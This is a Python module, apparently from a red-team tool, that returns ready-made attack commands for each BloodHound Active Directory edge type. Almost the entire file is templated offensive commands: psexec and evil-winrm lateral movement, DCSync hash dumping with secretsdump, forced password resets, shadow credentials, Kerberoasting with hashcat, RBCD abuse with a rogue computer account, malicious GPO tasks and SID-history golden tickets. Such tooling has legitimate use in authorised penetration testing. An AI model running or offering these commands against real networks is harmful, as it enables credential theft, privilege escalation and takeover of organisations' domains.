"""Exploit command suggestions for each BloodHound edge type."""

from __future__ import annotations
from dataclasses import dataclass, field


@dataclass
class CommandSet:
    description: str
    commands: list[str] = field(default_factory=list)

    @property
    def has_commands(self) -> bool:
        return bool(self.commands)


def _parse(nid: str, name: str) -> dict:
    """Extract short name, domain, and FQDN from a node label."""
    label = (name or nid).strip()
    if "@" in label:
        short, domain = label.rsplit("@", 1)
        return {"short": short, "domain": domain, "fqdn": label}
    if "." in label:
        parts = label.split(".")
        return {"short": parts[0].upper(), "domain": ".".join(parts[1:]), "fqdn": label}
    return {"short": label, "domain": "<DOMAIN>", "fqdn": label}


def get_commands(
    rel_type: str,
    src_id: str,
    dst_id: str,
    src_name: str = "",
    dst_name: str = "",
    src_kind: str = "",
    dst_kind: str = "",
) -> CommandSet:
    """Return exploitation steps for a given edge type."""
    src = _parse(src_id, src_name)
    dst = _parse(dst_id, dst_name)

    S = src["short"]        # e.g. john.doe
    D = src["domain"]       # e.g. corp.local
    T = dst["short"]        # e.g. DC01
    TF = dst["fqdn"]        # e.g. DC01.corp.local

    PASS = "<SRC_PASSWORD>"
    HASH = "<NTLM_HASH>"
    DC   = "<DC_IP>"

    match rel_type:

        case "MemberOf" | "Contains":
            return CommandSet("Structural relationship — no action required.")

        case "AdminTo":
            return CommandSet(
                f"Local admin on {TF} — execute commands or dump credentials.",
                [
                    f"impacket-psexec '{D}/{S}:{PASS}@{TF}'",
                    f"impacket-wmiexec '{D}/{S}:{PASS}@{TF}'",
                    f"evil-winrm -i {TF} -u '{S}' -p '{PASS}'",
                    f"# Pass-the-hash variant:",
                    f"impacket-psexec '{D}/{S}@{TF}' -hashes ':{HASH}'",
                ],
            )

        case "CanRDP":
            return CommandSet(
                f"RDP access to {TF}.",
                [
                    f"xfreerdp /v:{TF} /u:'{S}' /p:'{PASS}' /d:{D} /cert-ignore",
                ],
            )

        case "CanPSRemote":
            return CommandSet(
                f"WinRM / PSRemote access to {TF}.",
                [
                    f"evil-winrm -i {TF} -u '{S}' -p '{PASS}'",
                    f"evil-winrm -i {TF} -u '{S}' -H '{HASH}'",
                ],
            )

        case "ExecuteDCOM":
            return CommandSet(
                f"DCOM lateral movement to {TF}.",
                [
                    f"impacket-dcomexec -object MMC20 '{D}/{S}:{PASS}@{TF}' 'cmd.exe /c whoami'",
                ],
            )

        case "SQLAdmin":
            return CommandSet(
                f"SQL Server admin on {TF}.",
                [
                    f"impacket-mssqlclient '{D}/{S}:{PASS}@{TF}' -windows-auth",
                    f"# In mssqlclient: EXEC xp_cmdshell 'whoami'",
                ],
            )

        case "HasSession":
            return CommandSet(
                f"A privileged user has an active session on {TF}. Connect and steal the token.",
                [
                    f"impacket-psexec '{D}/{S}:{PASS}@{TF}'",
                    f"# Once on host, dump sessions:",
                    f"# mimikatz: sekurlsa::logonpasswords",
                    f"# Rubeus:   Rubeus.exe dump /nowrap",
                ],
            )

        case "DCSync":
            return CommandSet(
                f"DCSync — dump all domain hashes from the DC.",
                [
                    f"impacket-secretsdump -just-dc '{D}/{S}:{PASS}@{DC}'",
                    f"# Pass-the-hash variant:",
                    f"impacket-secretsdump -just-dc -hashes ':{HASH}' '{D}/{S}@{DC}'",
                    f"# On-host (Mimikatz):",
                    f"# lsadump::dcsync /domain:{D} /all /csv",
                ],
            )

        case "GetChangesAll":
            return CommandSet(
                "GetChangesAll + GetChanges = DCSync. Combine both rights to dump hashes.",
                [
                    f"impacket-secretsdump -just-dc '{D}/{S}:{PASS}@{DC}'",
                ],
            )

        case "GenericAll":
            return CommandSet(
                f"Full control over {TF}.",
                [
                    f"# Option 1 — force password reset (user target):",
                    f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{S}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{S}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
                    f"# Option 2 — add member (group target):",
                    f"net rpc group addmem '{T}' '{S}' -U '{D}/{S}%{PASS}' -S {DC}",
                    f"# Option 3 — shadow credentials (PKINIT required):",
                    f"pywhisker -d {D} -u '{S}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
                ],
            )

        case "AllExtendedRights":
            return CommandSet(
                f"All extended rights on {TF} — includes ForceChangePassword, DCSync (on domain), and more.",
                [
                    f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{S}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{S}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
                ],
            )

        case "AddMember" | "AddSelf":
            return CommandSet(
                f"Add a controlled user to group {TF}.",
                [
                    f"net rpc group addmem '{T}' '{S}' -U '{D}/{S}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{S}' -p '{PASS}' add groupMember '{T}' '{S}'",
                    f"# PowerView:",
                    f"Add-DomainGroupMember -Identity '{T}' -Members '{S}' -Credential $Cred",
                ],
            )

        case "ForceChangePassword":
            return CommandSet(
                f"Force-reset the password of {TF} without knowing the current one.",
                [
                    f"net rpc password '{T}' 'NewP@ssw0rd!' -U '{D}/{S}%{PASS}' -S {DC}",
                    f"bloodyAD --host {DC} -d {D} -u '{S}' -p '{PASS}' set password '{T}' 'NewP@ssw0rd!'",
                    f"# PowerView:",
                    f"Set-DomainUserPassword -Identity '{T}' -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force) -Credential $Cred",
                ],
            )

        case "GenericWrite":
            return CommandSet(
                f"Generic write on {TF} — write SPN (Kerberoast) or add shadow credentials.",
                [
                    f"# Option 1 — shadow credentials:",
                    f"pywhisker -d {D} -u '{S}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
                    f"# Option 2 — write a fake SPN then Kerberoast:",
                    f"bloodyAD --host {DC} -d {D} -u '{S}' -p '{PASS}' set object '{T}' servicePrincipalName -v 'fake/blah'",
                    f"impacket-GetUserSPNs '{D}/{S}:{PASS}' -dc-ip {DC} -request",
                    f"hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
                ],
            )

        case "WriteSPN":
            return CommandSet(
                f"Write SPN on {TF} then Kerberoast the account.",
                [
                    f"bloodyAD --host {DC} -d {D} -u '{S}' -p '{PASS}' set object '{T}' servicePrincipalName -v 'fake/blah'",
                    f"impacket-GetUserSPNs '{D}/{S}:{PASS}' -dc-ip {DC} -request",
                    f"hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt",
                ],
            )

        case "Owns" | "WriteOwner":
            return CommandSet(
                f"Take/confirm ownership of {TF}, then grant yourself FullControl.",
                [
                    f"owneredit.py -action write -new-owner '{S}' -target '{T}' '{D}/{S}:{PASS}' -dc-ip {DC}",
                    f"dacledit.py -action write -rights FullControl -principal '{S}' -target '{T}' '{D}/{S}:{PASS}' -dc-ip {DC}",
                    f"# Then abuse GenericAll (e.g. force password reset or add member)",
                ],
            )

        case "WriteDacl":
            return CommandSet(
                f"Modify DACL on {TF} — grant yourself FullControl (GenericAll).",
                [
                    f"dacledit.py -action write -rights FullControl -principal '{S}' -target '{T}' '{D}/{S}:{PASS}' -dc-ip {DC}",
                    f"# PowerView:",
                    f"Add-DomainObjectAcl -TargetIdentity '{T}' -PrincipalIdentity '{S}' -Rights All -Credential $Cred",
                ],
            )

        case "ReadLAPSPassword" | "SyncLAPSPassword":
            return CommandSet(
                f"Read the LAPS local admin password for {TF}.",
                [
                    f"impacket-GetLAPSPassword '{D}/{S}:{PASS}@{DC}' -computer-name '{T}'",
                    f"pyLAPS --action get -c '{T}' -d {D} -u '{S}' -p '{PASS}' --dc-ip {DC}",
                    f"# PowerShell:",
                    f"Get-ADComputer -Identity '{T}' -Properties 'ms-Mcs-AdmPwd' | Select -Expand 'ms-Mcs-AdmPwd'",
                ],
            )

        case "AllowedToDelegate":
            return CommandSet(
                f"Constrained delegation — impersonate Administrator on {TF}.",
                [
                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' '{D}/{S}:{PASS}' -dc-ip {DC}",
                    f"export KRB5CCNAME=Administrator@cifs_{T}.ccache",
                    f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                ],
            )

        case "AllowedToAct" | "WriteAccountRestrictions":
            return CommandSet(
                f"Resource-Based Constrained Delegation (RBCD) abuse on {TF}.",
                [
                    f"# 1. Create a controlled computer account:",
                    f"impacket-addcomputer '{D}/{S}:{PASS}' -computer-name 'PWNED$' -computer-pass 'Pwn3dP@ss' -dc-ip {DC}",
                    f"# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on {TF}:",
                    f"rbcd.py -f 'PWNED$' -t '{T}' -dc-ip {DC} '{D}/{S}:{PASS}'",
                    f"# 3. Get a service ticket as Administrator:",
                    f"impacket-getST -spn 'cifs/{TF}' -impersonate 'Administrator' '{D}/PWNED$:Pwn3dP@ss' -dc-ip {DC}",
                    f"export KRB5CCNAME=Administrator@cifs_{T}.ccache",
                    f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                ],
            )

        case "AddKeyCredentialLink":
            return CommandSet(
                f"Shadow credentials — add a key credential to {TF} then authenticate as it.",
                [
                    f"pywhisker -d {D} -u '{S}' -p '{PASS}' --target '{T}' --action add --dc-ip {DC}",
                    f"# pywhisker outputs the gettgtpkinit.py command, e.g.:",
                    f"gettgtpkinit.py -cert-pfx '{T}.pfx' -pfx-pass '<PFX_PASS>' '{D}/{T}' '{T}.ccache'",
                    f"export KRB5CCNAME='{T}.ccache'",
                    f"impacket-secretsdump -k -no-pass '{D}/{T}@{DC}'",
                ],
            )

        case "GPLink":
            return CommandSet(
                f"Modify a GPO linked to {TF} — push a malicious scheduled task.",
                [
                    f"pygpoabuse '{D}/{S}:{PASS}' -gpo-id '<GPO_GUID>' -dc-ip {DC} -command 'net localgroup administrators {S} /add' -taskname 'update'",
                    f"# Or SharpGPOAbuse:",
                    f"SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {S} --GPOName '<GPO_NAME>'",
                ],
            )

        case "TrustedBy":
            return CommandSet(
                f"Domain trust — {TF} trusts the current domain. Abuse with SID history / golden ticket.",
                [
                    f"# Forge an inter-realm TGT with extra SID (Enterprise Admins):",
                    f"impacket-ticketer -nthash '{HASH}' -domain-sid '<SRC_DOMAIN_SID>' -domain {D} -extra-sid '<DST_DOMAIN_SID>-519' Administrator",
                    f"export KRB5CCNAME=Administrator.ccache",
                    f"impacket-psexec -k -no-pass '{D}/Administrator@{TF}'",
                ],
            )

        case _:
            return CommandSet(
                f"Edge type '{rel_type}' — consult BloodHound documentation for exploitation steps."
            )
